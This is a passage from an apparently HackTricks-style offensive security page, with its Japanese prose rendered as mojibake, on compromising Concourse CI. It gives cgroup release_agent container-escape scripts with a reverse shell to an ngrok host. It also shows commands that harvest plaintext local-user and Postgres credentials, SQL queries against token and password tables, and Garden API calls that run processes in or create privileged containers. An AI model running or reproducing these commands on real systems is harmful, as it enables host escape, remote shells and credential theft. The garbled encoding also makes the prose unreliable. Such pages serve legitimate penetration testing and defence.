#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% hint style="warning" %}
æ°—ã¥ã„ãŸã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ãŒã€ã“ã‚Œã¯å˜ãªã‚‹[**regular release_agent escape**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/concourse-security/broken-reference/README.md)ã§ã€ãƒãƒ¼ãƒ‰å†…ã®cmdã®ãƒ‘ã‚¹ã‚’å¤‰æ›´ã™ã‚‹ã ã‘ã§ã™ã€‚
{% endhint %}

#### Workerã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰ãƒãƒ¼ãƒ‰ã¸ã®è„±å‡º

å°‘ã—ã®ä¿®æ­£ã‚’åŠ ãˆãŸé€šå¸¸ã®release_agent escapeãŒã“ã‚Œã«ã¯ååˆ†ã§ã™ï¼š
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
#### Webã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰ãƒãƒ¼ãƒ‰ã«è„±å‡º

Webã‚³ãƒ³ãƒ†ãƒŠã«ä¸€éƒ¨ã®é˜²å¾¡ãŒç„¡åŠ¹ã«ãªã£ã¦ã„ã¦ã‚‚ã€ãã‚Œã¯**ä¸€èˆ¬çš„ãªç‰¹æ¨©ã‚³ãƒ³ãƒ†ãƒŠã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¦ã„ãªã„**ï¼ˆãŸã¨ãˆã°ã€**ãƒã‚¦ãƒ³ãƒˆ**ã™ã‚‹ã“ã¨ã¯ã§ããšã€**æ¨©é™**ã‚‚éå¸¸ã«**åˆ¶é™ã•ã‚Œã¦ã„ã‚‹**ãŸã‚ã€ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰è„±å‡ºã™ã‚‹ç°¡å˜ãªæ–¹æ³•ã¯ç„¡åŠ¹ã§ã™ï¼‰ã€‚

ãŸã ã—ã€**ãƒ­ãƒ¼ã‚«ãƒ«è³‡æ ¼æƒ…å ±ã‚’å¹³æ–‡ã§ä¿å­˜**ã—ã¦ã„ã¾ã™ã€‚
```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```
You cloud use that credentials to **web server** and **privileged container and escape to the node**.

In the environment you can also find information to **postgresql** instance that concourse uses (address, **username**, **password** and database among other info):
```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```
#### Gardenã‚µãƒ¼ãƒ“ã‚¹ã®ä¹±ç”¨ - å®Ÿéš›ã®æ”»æ’ƒã§ã¯ã‚ã‚Šã¾ã›ã‚“

{% hint style="warning" %}
ã“ã‚Œã¯ã‚µãƒ¼ãƒ“ã‚¹ã«é–¢ã™ã‚‹èˆˆå‘³æ·±ã„ãƒ¡ãƒ¢ã§ã™ãŒã€localhostã§ã®ã¿ãƒªã‚¹ãƒ‹ãƒ³ã‚°ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€ã“ã‚Œã‚‰ã®ãƒ¡ãƒ¢ã¯ã™ã§ã«æ‚ªç”¨ã•ã‚Œã¦ã„ã‚‹å½±éŸ¿ã‚’ç¤ºã—ã¾ã›ã‚“
{% endhint %}

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€å„Concourseãƒ¯ãƒ¼ã‚«ãƒ¼ã¯ãƒãƒ¼ãƒˆ7777ã§[Garden](https://github.com/cloudfoundry/garden)ã‚µãƒ¼ãƒ“ã‚¹ã‚’å®Ÿè¡Œã—ã¦ã„ã¾ã™ã€‚ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ã¯Webãƒã‚¹ã‚¿ãƒ¼ãŒãƒ¯ãƒ¼ã‚«ãƒ¼ã«**ä½•ã‚’å®Ÿè¡Œã™ã‚‹ã‹ã‚’æŒ‡ç¤º**ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ï¼ˆã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã€å„ã‚¿ã‚¹ã‚¯ã‚’å®Ÿè¡Œã—ã¾ã™ï¼‰ã€‚ã“ã‚Œã¯æ”»æ’ƒè€…ã«ã¨ã£ã¦ã‹ãªã‚Šé­…åŠ›çš„ã§ã™ãŒã€ã„ãã¤ã‹ã®ç´ æ™´ã‚‰ã—ã„ä¿è­·æ©Ÿèƒ½ãŒã‚ã‚Šã¾ã™ï¼š

- **ãƒ­ãƒ¼ã‚«ãƒ«ã«ã®ã¿å…¬é–‹**ã•ã‚Œã¦ã„ã¾ã™ï¼ˆ127.0.0.1ï¼‰ã—ã€ãƒ¯ãƒ¼ã‚«ãƒ¼ãŒWebã«ç‰¹åˆ¥ãªSSHã‚µãƒ¼ãƒ“ã‚¹ã§èªè¨¼ã™ã‚‹ã¨ãã€Webã‚µãƒ¼ãƒãƒ¼ãŒå„ãƒ¯ãƒ¼ã‚«ãƒ¼å†…ã®å„Gardenã‚µãƒ¼ãƒ“ã‚¹ã¨**é€šä¿¡**ã™ã‚‹ãŸã‚ã®ãƒˆãƒ³ãƒãƒ«ãŒä½œæˆã•ã‚Œã‚‹ã¨æ€ã‚ã‚Œã¾ã™ã€‚
- Webã‚µãƒ¼ãƒãƒ¼ã¯æ•°ç§’ã”ã¨ã«**å®Ÿè¡Œä¸­ã®ã‚³ãƒ³ãƒ†ãƒŠã‚’ç›£è¦–**ã—ã€**äºˆæœŸã—ãªã„**ã‚³ãƒ³ãƒ†ãƒŠã¯**å‰Šé™¤**ã•ã‚Œã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€**ã‚«ã‚¹ã‚¿ãƒ ã‚³ãƒ³ãƒ†ãƒŠã‚’å®Ÿè¡Œ**ã—ãŸã„å ´åˆã¯ã€Webã‚µãƒ¼ãƒãƒ¼ã¨Gardenã‚µãƒ¼ãƒ“ã‚¹ã®**é€šä¿¡**ã‚’**æ”¹ã–ã‚“**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

Concourseãƒ¯ãƒ¼ã‚«ãƒ¼ã¯é«˜ã„ã‚³ãƒ³ãƒ†ãƒŠæ¨©é™ã§å®Ÿè¡Œã•ã‚Œã¾ã™ï¼š
```
Container Runtime: docker
Has Namespaces:
pid: true
user: false
AppArmor Profile: kernel
Capabilities:
BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```
ã—ã‹ã—ã€ãƒãƒ¼ãƒ‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãŒã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§ã¯ãªãã€ä»®æƒ³ãƒ‡ãƒã‚¤ã‚¹ã®ã¿ãŒåˆ©ç”¨å¯èƒ½ã§ã‚ã‚‹ãŸã‚ã€/dev ãƒ‡ãƒã‚¤ã‚¹ã‚’ãƒã‚¦ãƒ³ãƒˆã—ãŸã‚Šã€release_agent ã‚’ä½¿ç”¨ã—ãŸã‚Šã™ã‚‹ãªã©ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“ã€‚ãƒãƒ¼ãƒ‰ã®ãƒ—ãƒ­ã‚»ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ãŸã‚ã€ã‚«ãƒ¼ãƒãƒ«ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ä½¿ç”¨ã›ãšã«ãƒãƒ¼ãƒ‰ã‹ã‚‰è„±å‡ºã™ã‚‹ã“ã¨ã¯è¤‡é›‘ã«ãªã‚Šã¾ã™ã€‚

{% hint style="info" %}
å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ç‰¹æ¨©ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰è„±å‡ºã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¦ãã¾ã—ãŸã€‚ã—ãŸãŒã£ã¦ã€ç¾åœ¨ã®ãƒ¯ãƒ¼ã‚«ãƒ¼ã«ã‚ˆã£ã¦ä½œæˆã•ã‚ŒãŸç‰¹æ¨©ã‚³ãƒ³ãƒ†ãƒŠå†…ã§ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚Œã°ã€ãƒãƒ¼ãƒ‰ã«è„±å‡ºã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

Concourseã‚’æ“ä½œã—ã¦ã„ã‚‹éš›ã«æ°—ã¥ã„ãŸã“ã¨ã§ã™ãŒã€æ–°ã—ã„ã‚³ãƒ³ãƒ†ãƒŠãŒç”Ÿæˆã•ã‚Œã¦ä½•ã‹ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€ãã®ã‚³ãƒ³ãƒ†ãƒŠã®ãƒ—ãƒ­ã‚»ã‚¹ã¯ãƒ¯ãƒ¼ã‚«ãƒ¼ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§ã‚ã‚Šã€ã¾ã‚‹ã§ã‚³ãƒ³ãƒ†ãƒŠãŒãã®ä¸­ã§æ–°ã—ã„ã‚³ãƒ³ãƒ†ãƒŠã‚’ä½œæˆã—ã¦ã„ã‚‹ã‹ã®ã‚ˆã†ã§ã™ã€‚

**å®Ÿè¡Œä¸­ã®ç‰¹æ¨©ã‚³ãƒ³ãƒ†ãƒŠã«å…¥ã‚‹**
```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
## In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'

# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```
**ç‰¹æ¨©ã‚³ãƒ³ãƒ†ãƒŠã®ä½œæˆ**

æ–°ã—ã„ã‚³ãƒ³ãƒ†ãƒŠã‚’ç°¡å˜ã«ä½œæˆã—ï¼ˆãƒ©ãƒ³ãƒ€ãƒ ãªUIDã§å®Ÿè¡Œï¼‰ã€ãã®ä¸Šã§ä½•ã‹ã‚’å®Ÿè¡Œã§ãã¾ã™ï¼š
```bash
curl -X POST http://127.0.0.1:7777/containers \
-H 'Content-Type: application/json' \
-d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```
ã—ã‹ã—ã€Webã‚µãƒ¼ãƒãƒ¼ã¯å®šæœŸçš„ã«å®Ÿè¡Œä¸­ã®ã‚³ãƒ³ãƒ†ãƒŠã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãŠã‚Šã€äºˆæœŸã—ãªã„ã‚³ãƒ³ãƒ†ãƒŠãŒè¦‹ã¤ã‹ã£ãŸå ´åˆã¯å‰Šé™¤ã•ã‚Œã¾ã™ã€‚é€šä¿¡ãŒHTTPã§è¡Œã‚ã‚Œã¦ã„ã‚‹ãŸã‚ã€é€šä¿¡ã‚’æ”¹ã–ã‚“ã—ã¦äºˆæœŸã—ãªã„ã‚³ãƒ³ãƒ†ãƒŠã®å‰Šé™¤ã‚’å›é¿ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```
## å‚è€ƒæ–‡çŒ®

* https://concourse-ci.org/vars.html

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„** ã¾ãŸã¯ **HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã¾ãŸã¯ [**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€** [**HackTricks**](https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
